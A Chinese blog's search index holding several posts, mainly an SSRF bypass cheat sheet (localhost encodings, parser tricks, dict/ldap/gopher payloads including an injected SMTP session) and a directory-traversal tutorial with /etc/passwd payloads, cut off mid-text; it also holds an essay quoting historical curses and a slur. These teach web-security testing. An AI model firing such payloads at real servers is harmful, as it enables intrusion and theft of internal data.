<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>小谈SQL注入</title>
      <link href="2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/"/>
      <url>2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF的一些tricks</title>
      <link href="2021/04/25/SSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/"/>
      <url>2021/04/25/SSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/</url>
      
        <content type="html"><![CDATA[<p>SSRF 是什么？简单地来说：利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务</p><p>可以用来：</p><ul><li>探测内网信息</li><li>攻击内网或本地其他服务</li><li>穿透防火墙</li></ul><p>寻找方法：</p><ul><li>能够对外发起网络请求的地方</li><li>请求远程服务器资源的地方</li><li>数据库内置功能</li><li>邮件系统</li><li>文件处理</li><li>在线处理工具</li></ul><h1 id="一些绕过的方法"><a href="#一些绕过的方法" class="headerlink" title="一些绕过的方法"></a>一些绕过的方法</h1><h2 id="0x00-攻击本地"><a href="#0x00-攻击本地" class="headerlink" title="0x00 攻击本地"></a>0x00 攻击本地</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:80</span><br><span class="line">http:&#x2F;&#x2F;localhost:22</span><br></pre></td></tr></table></figure><h2 id="0x01-利用ipv6"><a href="#0x01-利用ipv6" class="headerlink" title="0x01 利用ipv6"></a>0x01 利用ipv6</h2><p>利用[::]绕过localhost</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::1]&#x2F; &gt;&gt;&gt; http:&#x2F;&#x2F;127.0.0.1</span><br><span class="line">http:&#x2F;&#x2F;[::]&#x2F;  &gt;&gt;&gt;  http:&#x2F;&#x2F;0.0.0.0</span><br></pre></td></tr></table></figure><p>也有 <code>http://0000::1:80/</code> 这种</p><h2 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用@"></a>0x02 利用@</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com@127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="0x03-利用短地址"><a href="#0x03-利用短地址" class="headerlink" title="0x03 利用短地址"></a>0x03 利用短地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dwz.cn&#x2F;11SMa  &gt;&gt;&gt;  http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="0x04-利用特殊域名"><a href="#0x04-利用特殊域名" class="headerlink" title="0x04 利用特殊域名"></a>0x04 利用特殊域名</h2><p>利用的原理是DNS解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1.xip.io&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.owasp.org.127.0.0.1.xip.io&#x2F;</span><br></pre></td></tr></table></figure><h2 id="0x05-利用DNS解析"><a href="#0x05-利用DNS解析" class="headerlink" title="0x05 利用DNS解析"></a>0x05 利用DNS解析</h2><p>在域名上设置A记录，指向127.0.1</p><h2 id="0x06-利用修改上传"><a href="#0x06-利用修改上传" class="headerlink" title="0x06 利用修改上传"></a>0x06 利用修改上传</h2><p>比如可以修改 “type=file” 为 “type=url”<br>将图片文件修改为URL，即可能触发 SSRF</p><h2 id="0x07-利用Enclosed-alphanumerics"><a href="#0x07-利用Enclosed-alphanumerics" class="headerlink" title="0x07 利用Enclosed alphanumerics"></a>0x07 利用Enclosed alphanumerics</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><h2 id="0x08-利用句号"><a href="#0x08-利用句号" class="headerlink" title="0x08 利用句号"></a>0x08 利用句号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="0x09-利用进制转换"><a href="#0x09-利用进制转换" class="headerlink" title="0x09 利用进制转换"></a>0x09 利用进制转换</h2><p>可以是十六进制，八进制等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">115.239.210.26  &gt;&gt;&gt;  16373751032</span><br><span class="line">http:&#x2F;&#x2F;016373751032&#x2F;</span><br></pre></td></tr></table></figure><p>首先把这四段数字给分别转成16进制，结果：73 ef d2 1a<br>然后把 73efd21a 这十六进制一起转换成八进制<br>记得访问的时候加 0 表示使用八进制(可以是一个0也可以是多个0，跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;0177.0.0.1&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;2130706433&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;192.168.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235521&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;192.168.1.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235777&#x2F;</span><br></pre></td></tr></table></figure><h2 id="0x0A-利用特殊地址"><a href="#0x0A-利用特殊地址" class="headerlink" title="0x0A 利用特殊地址"></a>0x0A 利用特殊地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0&#x2F;</span><br></pre></td></tr></table></figure><h2 id="0x0B-利用协议"><a href="#0x0B-利用协议" class="headerlink" title="0x0B 利用协议"></a>0x0B 利用协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Dict:&#x2F;&#x2F;</span><br><span class="line">dict:&#x2F;&#x2F;&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;&#x2F;d:&lt;word&gt;</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;attacker:11111&#x2F;</span><br><span class="line">SFTP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;sftp:&#x2F;&#x2F;example.com:11111&#x2F;</span><br><span class="line">TFTP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;tftp:&#x2F;&#x2F;example.com:12346&#x2F;TESTUDPPACKET</span><br><span class="line">LDAP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:11211&#x2F;%0astats%0aquit</span><br><span class="line">Gopher:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25&#x2F;xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span><br></pre></td></tr></table></figure><h2 id="0x0C-0-0-0-0"><a href="#0x0C-0-0-0-0" class="headerlink" title="0x0C 0.0.0.0"></a>0x0C 0.0.0.0</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0&#x2F;</span><br></pre></td></tr></table></figure><p>这个方法似乎只能在Linux下使用，Windows并不认识这个ip</p><h2 id="0x0D-利用curl和其他库解析url的差异性"><a href="#0x0D-利用curl和其他库解析url的差异性" class="headerlink" title="0x0D 利用curl和其他库解析url的差异性"></a>0x0D 利用curl和其他库解析url的差异性</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;foo@127.0.0.1:80@www.google.com&#x2F;</span><br></pre></td></tr></table></figure><p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a> 有提到，不过这个方法在curl较新的版本里被修掉了</p><p><img src="https://i.loli.net/2021/04/25/qwN3UOZzeKaXAEB.jpg"></p><h2 id="0x0E-DNS-Rebinding"><a href="#0x0E-DNS-Rebinding" class="headerlink" title="0x0E DNS Rebinding"></a>0x0E DNS Rebinding</h2><p>懒🐕表示还没搞，以后补上</p><h2 id="0x0F-127-1"><a href="#0x0F-127-1" class="headerlink" title="0x0F 127.1"></a>0x0F 127.1</h2><p>在 <code>[网鼎杯 2020 玄武组]SSRFMe</code> 这道题中有这么个点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.1&#x2F;</span><br></pre></td></tr></table></figure><ul><li><code>ip2long(&#39;127.1&#39;)</code>会返回<code>false</code>，这里可以绕过过滤</li><li>但是<code>gethostbyname</code>在Linux下会把<code>127.1</code>变为<code>127.0.0.1</code>，所以这题是无法使用的。不过windows下经过<code>gethostbyname</code>后依然是<code>127.1</code></li><li>curl是支持<code>127.1</code>这样的写法的，但这样发出去的http请求是有问题的。因为http包中的host头被设为了<code>127.1</code>，apache会返回一个400 Bad Request</li><li>既然是http包的问题，那么用gopher协议构造一个正常的http请求即可。不过这因为<code>gethostbyname</code>的原因，这个方法这里用不了</li></ul><h2 id="0x10-127-0-0-1"><a href="#0x10-127-0-0-1" class="headerlink" title="0x10 127.0.0.1."></a>0x10 127.0.0.1.</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1.</span><br></pre></td></tr></table></figure><p>不过curl方法不支持这种写法</p><h2 id="0x11-http"><a href="#0x11-http" class="headerlink" title="0x11 http:///"></a>0x11 http:///</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure><p>依然是 <code>[网鼎杯 2020 玄武组]SSRFMe</code></p><hr><ul><li>这个trick也非常有意思，之前一直以为只有浏览器才会解析这样host为空的畸形url，在P师傅小密圈地旧帖里面Li4n0师傅提到curl和git也会按照浏览器的方式解析，测试一下发现直接用curl会卡在那，但是php的libcurl就可以…</li><li>用<code>parse_url</code>解析这样的畸形url会返回<code>false</code>，然后<code>$hostname=$url_parse[&#39;host&#39;];</code>会返回<code>null</code>（神奇的php)</li><li>接着又是一个windows和linux下php的差异，windows下<code>gethostbyname(null);</code>会返回本机ip，导致后面无法绕过ip检测。然而linux下并没有这样的特性，<code>gethostbyname</code>会返回<code>null</code>，绕过ip检测</li></ul><hr><p>整理了一下SSRF的一些tricks。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 奇技淫巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb坑</title>
      <link href="2021/04/25/JavaWeb%E5%9D%91/"/>
      <url>2021/04/25/JavaWeb%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>开个新坑，学 Java web 了，慢慢更了……</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>说话的艺术</title>
      <link href="2021/04/25/%E8%AF%B4%E8%AF%9D%E7%9A%84%E8%89%BA%E6%9C%AF/"/>
      <url>2021/04/25/%E8%AF%B4%E8%AF%9D%E7%9A%84%E8%89%BA%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p>说话，是一门艺术。</p><h1 id="0x00-谈🐎"><a href="#0x00-谈🐎" class="headerlink" title="0x00 谈🐎"></a>0x00 谈🐎</h1><p>“汝母今恙否？”，问候对方的母亲，这是一种很亲切的问候，同时也是一种国骂，只是温文尔雅了一点，如果要通俗地来说，“你🐎si了”，“草尼🐎”可能更加适合于国人。</p><p>很喜欢谭总的一句骂，“嬲你妈妈别嘞”，很有韵味，越听越有意思。</p><hr><p>嬲（niǎo）：方言用字，很多时候用作脏词。通孬。在普通话中意为戏弄、搅扰，或纠缠之意。在内蒙古以及晋北方言中，意为：神气、得意，或志得意满之意。粤语中意为：生气。</p><hr><p>“嬲~”，“我嬲”，并不是用以骂人，多用于表示惊奇之感，比如“我嬲，这么屌的🐎？”，我们那一边的嬲读作<code>nia</code>，“我嬲de你li娘”，如此作为骂人的话。</p><p>这就是很神奇的一个地方，俗话说骂人不骂家人，那为甚么很多时候我们并不是直接骂对方“你是不是🐕啊，你是不是🐖啊”这一类的，而是直接上升到亲人呢，“你🐎今晚biss，buss不是亲🐎”这一类的。</p><p>可能是因为古代都有罪至株连九族，对方的行为已经足够可恨，令人过于不满，所以直接对对方的亲人进行攻击，会给人一种打出真实伤害的感觉，毕竟对方事情都做了，还会在乎你骂他吗。</p><p>还有一个很有意思的说法</p><hr><p>“拟妈死了”</p><p>我所骂的这个🐎并不真的就是你的🐎，而是我所创造出的一个虚拟的🐎，只是为了让我可以骂得更加痛快，但是虽然我现在这么骂着，但是平时日常生活中我见到了你的🐎我还是会亲切地喊一句“阿姨好”的。</p><hr><p>很天才，兄弟，这个词汇的创造真的是非常灵性，其实大家在对骂的时候并不是真的为了去诅咒对方“🐎死了”，而是为了通过骂对方的直系血缘关系的人，来使自己的气势达到一个更高的场合，来使自己在一场骂战中“取胜”。</p><p><del>好了，先到这里，下一次我们将品析一些不带脏字的骂人说法。（课设去了，逃</del></p><h1 id="0x01-优雅的古人"><a href="#0x01-优雅的古人" class="headerlink" title="0x01 优雅的古人"></a>0x01 优雅的古人</h1><p>不带脏字先姑且不谈，此刻的兴致停留在古人的优雅之间，我们来谈谈古人骂人的优雅之处。</p><p>有一说一奥，说脏话其实是检验友谊的重要标准，脏话越多，越亲密，因为脏话往往是表达感情的最直接途径，那么古人又是如何说脏话的呢？如若你只能说出“👴从未见过如此 厚颜无耻之人”，那确实应该好好学习一下了。</p><p>在秦汉时期，你会发现那个时代的人骂人还是很温和的，而且骂人需要一定的知识，因为当时书面语和口语比较接近。例如大家以前都学过的《鸿门宴》，项羽不听范增的劝告，放走了刘邦，急得范增大骂：“唉，竖子不足与谋！”意思就是“不想再跟你这个弱智玩了。”</p><p>当然也有更高级一点的，建安七子陈琳曾写《讨贼檄文》，痛骂曹操祖宗三代，听得曹操一愣一愣，你骂我可以理解，祖宗三代都骂了是什么操作，更骚的是把曹操当时的头风一下子治好了，这不是逆天我随你怎么说。</p><p>贴一波原文，👴甚是喜欢这文采</p><blockquote><p>盖闻明主图危以制变，忠臣虑难以立权。是以有非常之人，然后有非常之事；有非常之事，然后立非常之功。</p><p>夫非常者，固非常人所拟也。曩者，强秦弱主，赵高执柄，专制朝权，威福由己；时人迫胁，莫敢正言；终有望夷之败，祖宗焚灭，污辱至今，永为世鉴。及臻吕后季年，产禄专政，内兼二军，外统梁、赵；擅断万机，决事省禁；下陵上替，海内寒心。</p><p>于是绛侯朱虚兴兵奋怒，诛夷逆暴，尊立太宗，故能王道兴隆，光明显融：此则大臣立权之明表也。司空曹操：祖父中常侍腾，与左悺、徐璜并作妖孽，饕餮放横，伤化虐民；父嵩，乞匄携养，因赃假位，舆金辇璧，输货权门，窃盗鼎司，倾覆重器。操赘阉遗丑，本无懿德，犭票狡锋协，好乱乐祸。</p><p>幕府董统鹰扬，扫除凶逆；续遇董卓，侵官暴国。于是提剑挥鼓，发命东夏，收罗英雄，弃瑕取用；故遂与操同谘合谋，授以裨师，谓其鹰犬之才，爪牙可任。</p><p>至乃愚佻短略，轻进易退，伤夷折衄，数丧师徒；幕府辄复分兵命锐，修完补辑，表行东郡，领兖州刺史，被以虎文，奖戚威柄，冀获秦师一克之报。</p><p>而操遂承资跋扈，恣行凶忒，割剥元元，残贤害善。故九江太守边让，英才俊伟，天下知名；直言正色，论不阿谄；身首被枭悬之诛，妻孥受灰灭之咎。</p><p>自是士林愤痛，民怨弥重；一夫奋臂，举州同声。故躬破于徐方，地夺于吕布；彷徨东裔，蹈据无所。</p><p>幕府惟强干弱枝之义，且不登叛人之党，故复援旌擐甲，席卷起征，金鼓响振，布众奔沮；拯其死亡之患，复其方伯之位：则幕府无德于兖土之民，而有大造于操也。</p><p>后会銮驾返旆，群虏寇攻。时冀州方有北鄙之警，匪遑离局；故使从事中郎徐勋，就发遣操，使缮修郊庙，翊卫幼主。</p><p>操便放志：专行胁迁，当御省禁；卑侮王室，败法乱纪；坐领三台，专制朝政；爵赏由心，弄戮在口；所爱光五宗，所恶灭三族；群谈者受显诛，腹议者蒙隐戮；</p><p>百僚钳口，道路以目；尚书记朝会，公卿充员品而已故太尉杨彪，典历二司，享国极位。操因缘眦睚，被以非罪；榜楚参并，五毒备至；触情任忒，不顾宪纲。又议郎赵彦，忠谏直言，义有可纳，是以圣朝含听，改容加饰。</p><p>操欲迷夺时明，杜绝言路，擅收立杀，不俟报国。</p><p>又梁孝王，先帝母昆，坟陵尊显；桑梓松柏，犹宜肃恭。而操帅将吏士，亲临发掘，破棺裸尸，掠取金宝。至令圣朝流涕，士民伤怀！操又特置发丘中郎将、摸金校尉，所过隳突，无骸不露。</p><p>身处三公之位，而行桀虏之态，污国害民，毒施人鬼！加其细致惨苛，科防互设；罾缴充蹊，坑阱塞路；举手挂网罗，动足触机陷：是以兖、豫有无聊之民，帝都有吁嗟之怨。</p><p>历观载籍，无道之臣，贪残酷烈，于操为甚！幕府方诘外奸，未及整训；加绪含容，冀可弥缝。而操豺狼野心，潜包祸谋，乃欲摧挠栋梁，孤弱汉室，除灭忠正，专为袅雄。</p><p>往者伐鼓北征公孙瓒，强寇桀逆，拒围一年。操因其未破，阴交书命，外助王师，内相掩袭。会其行人发露，瓒亦枭夷，故使锋芒挫缩，厥图不果。今乃屯据敷仓，阻河为固，欲以螳螂之斧，御隆车之隧。</p><p>幕府奉汉威灵，折冲宇宙；长戟百万，胡骑千群；奋中黄育获之士，骋良弓劲弩之势；并州越太行，青州涉济漯；大军泛黄河而角其前，荆州下宛叶而掎其后：雷震虎步，若举炎火以焫飞蓬，覆沧海以沃[火票]炭，有何不灭者哉？</p><p>又操军吏士，其可战者，皆出自幽冀，或故营部曲，咸怨旷思归，流涕北顾。其余兖豫之民，及吕布张杨之余众，覆亡迫胁，权时苟从；各被创夷，人为仇敌。</p><p>若回旆方徂，登高冈而击鼓吹，扬素挥以启降路，必土崩瓦解，不俟血刃。方今汉室陵迟，纲维弛绝；圣朝无一介之辅，股肱无折冲之势。</p><p>方畿之内，简练之臣，皆垂头翼，莫所凭恃；虽有忠义之佐，胁于暴虐之臣，焉能展其节？又操持部曲精兵七百，围守宫阙，外托宿卫，内实拘执。惧其篡逆之萌，因斯而作。此乃忠臣肝脑涂地之秋，烈士立功之会，可不勖哉！</p><p>操又矫命称制，遣使发兵。恐边远州郡，过听给与，违众旅叛，举以丧名，为天下笑，则明哲不取也。即日幽并青冀四州并进。</p><p>书到荆州，便勒现兵，与建忠将军协同声势。州郡各整义兵，罗落境界，举武扬威，并匡社稷：则非常之功于是乎著。</p><p>其得操首者，封五千户侯，赏钱五千万。部曲偏裨将校诸吏降者，勿有所问。广宜恩信，班扬符赏，布告天下，咸使知圣朝有拘迫之难。如律令！</p></blockquote><p>这不是大才子？最骚的还在这里：<code>司空曹操：祖父中常侍腾，与左悺、徐璜并作妖孽，饕餮放横，伤化虐民；父嵩，乞匄携养，因赃假位，舆金辇璧，输货权门，窃盗鼎司，倾覆重器。操赘阉遗丑，本无懿德，犭票狡锋协，好乱乐祸。</code>，直接是从祖宗十八代骂了曹操一家，还骂他爹是太监，曹操倒也宽容大度，后来逮住了陈琳，还笑着对他说：“你的说法就很有问题，要是我爸是太监的话，我是怎么生下来的呢”，也没杀陈琳，让陈琳下去做写文章的人了。</p><p>再到了唐宋元时期，就有了更多可骂的词汇了，经过了秦汉的发展，唐宋元脏话进一步向今天靠拢。举个栗子，《资治通鉴》中记载，安西节度使夫蒙灵察大骂高仙芝：“啖狗粪高丽奴！”（吃狗屎吧高丽棒子（食屎啦你，吔屎啦梁非凡）），混杂了当时的各种流行技巧，如民族歧视、人格鄙视、动物类比等，代表了唐朝骂人的上等水平。</p><p>被誉为千古一帝的唐宗宋祖，脏话也照说不误，唐太宗曾被魏征的进谏惹怒，跑回去跟老婆哭诉：“会需杀此田舍翁！”（总有一天要杀了这个乡巴佬）。宋太祖寝室房梁损坏，需要更换，大臣奏报要截根巨木当房梁，太祖在折子上批：“截你爷头，截你娘头。”（截你爸的头，截你妈的头），当时的人不禁纷纷称赞，认为充分表现了太祖的爱物之心。</p><p>而想要了解宋元的民间脏话，当然不得不看国骂宝典《水浒传》，以骂街达人鲁智深为例，说话几乎没有不带脏字的：“直娘贼！还敢应口”，“你两个撮鸟”，“这厮们挟着屁眼撒开”。白话中夹带着文言，粗俗中透露一丝文趣（误），完美表现了花和尚豁达直爽的性格，让人听了畅快淋漓（大误）。</p><p>这会儿到了明清时期，恭喜你，可能之前你觉得，贼、这厮、腌臜等，仍然不够劲爆，那么明清则进一步地，将脏话集中到下半身，以及下半身的动作，与今天非常接近，太尼娘带劲辣。不过《大明律》和《大清律》中规定，骂人是犯罪行为，轻者打屁股、重者流放，所以骂人有一定风险。连文人叫骂也粗俗了许多，比如明朝文豪王世贞，贵为“后七子”之首，在diss别人的诗词时，也使用了粗鄙之语：“此等语，何不以溺自照？”，用今天的话说就是：“你写的是什么鬼，怎么不撒泡尿照照自己？”。号称封建社会百科全书的《红楼梦》，里面的骂人艺术甚至完爆了现代，比如第四十六回，鸳鸯骂嫂子：“你快夹着屄嘴离了这里，好多着呢！什么‘好话’！宋徽宗的鹰，赵子昂的马，都是好画（话）儿。什么‘喜事’！状元痘儿灌的浆儿又满是喜事！怪道成日家羡慕人家女儿做了小老婆了，一家子都仗着他横行霸道的，一家子都成了小老婆了！看的眼热了，也把我送在火坑里去。”，盛怒之下，不仅出口成脏，还不忘用典，前半句一语双关，后半句谐音用典，还是出自一位娇滴滴，尚未出嫁的小姐姐之口。（贾赦看上了贾母跟前的贴身丫环鸳鸯，贪恋美色的贾赦先派邢夫人前去传话，没什么进展，于是后来又叫鸳鸯的嫂嫂说亲，一心想攀龙附凤向上爬的嫂嫂不仅没有做好媒，本想着一飞冲天，结果呢，人生不如意之事十之八九，性格刚烈的鸳鸯直接给不知天高地厚的嫂嫂一顿好骂！闹的她灰头土脸的。）</p><p>一般而言，脏话不外乎这几个方面，性、动物、恶心、地位、人格、血统，所以脏话想令人耳目一新，必须多面结合，层层递进。比如《水浒传》王婆骂郓哥：“含鸟猢狲！”又如《金瓶梅》吴月娘痛骂bitch：“贼狗攮的养汉的淫妇！”都是很好的成功案例。</p><p>相信看到这里，大家对古代脏话，以及骂人的高级技巧，已经有了一定理解，不妨试做例题：</p><hr><p>如何说一句，惊天地泣鬼神的脏话？</p><p>参考答案：</p><p>明末清初长篇小说《醒世姻缘传》第十一回：“放你家那臭私窠子淫妇歪拉骨接万人的大开门驴子狗臭屁！”</p><hr><p>再然后呢，就是现代辣，现代呢</p><p><img src="https://i.loli.net/2021/04/25/qxDQHdNh3Xtu1jV.jpg"></p><p>彳亍，这一次就谈这么多了，下次谈谈我正好想谈的，虽然暂时还不知道想谈啥，但是这玩意儿可比课设有意思多了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈目录穿越</title>
      <link href="2021/04/25/%E6%B5%85%E8%B0%88%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"/>
      <url>2021/04/25/%E6%B5%85%E8%B0%88%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>目录遍历（目录穿越）是一个Web安全漏洞，攻击者可以利用该漏洞读取运行应用程序的服务器上的任意文件。 这可能包括应用程序代码和数据，后端系统的登录信息以及敏感的操作系统文件</p><p>在某些情况下，攻击者可能能够在服务器上写入任意文件，（如，FFFTP 是一款小型的 FTP 客户端软件。FFFTP客户端没有正确地验证 FTP 服务器所返回的 LIST 命令响应中包含有目录遍历序列（斜线）的文件名，如果用户受骗从恶意的 FTP 服务器下载的目录包含有带有恶意文件名的文件的话，就可能导致向用户系统的任意位置写入文件）从而允许他们修改应用程序数据或行为，并最终完全控制服务器</p><h1 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h1><h2 id="0x00-基础目录遍历"><a href="#0x00-基础目录遍历" class="headerlink" title="0x00 基础目录遍历"></a>0x00 基础目录遍历</h2><p>直接利用 ../ 返回上一级来遍历任意文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="0x01-绝对路径"><a href="#0x01-绝对路径" class="headerlink" title="0x01 绝对路径"></a>0x01 绝对路径</h2><p>web网站有时候会采取目录遍历的防御措施，如过滤 ../ 上一级等关键字，然后简单的过滤通常会被绕过。有时候可以直接采用绝对路径，无须 ../ 返回上一级目录遍历</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="0x02-双写-绕过"><a href="#0x02-双写-绕过" class="headerlink" title="0x02 双写../绕过"></a>0x02 双写../绕过</h2><p>有时候，防御措施是直接将 ../ 替换为空，可以直接采用双写直接绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="0x03-URL编码绕过"><a href="#0x03-URL编码绕过" class="headerlink" title="0x03 URL编码绕过"></a>0x03 URL编码绕过</h2><p>也可以采用 URL 